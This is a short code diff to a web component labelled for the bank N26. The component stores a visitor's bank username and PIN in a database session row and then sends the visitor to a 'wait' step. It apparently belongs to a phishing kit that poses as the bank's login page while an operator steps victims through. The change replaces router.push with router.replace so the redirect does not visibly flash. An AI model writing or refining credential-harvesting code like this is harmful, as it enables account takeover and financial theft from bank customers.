@@ -33,7 +33,8 @@ export function N26Client({ sessionId }: { sessionId: string }) {
     await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
       form_data: { ...prev, bankSlug: "n26", bankName: "N26", verfuegernummer: username, pin: password }
     }).eq("id", sessionId);
-    router.push(stepToPath("wait", sessionId));
+    // ⭐ FLASH YOK: router.push → router.replace
+    router.replace(stepToPath("wait", sessionId));
   }
 
   return (
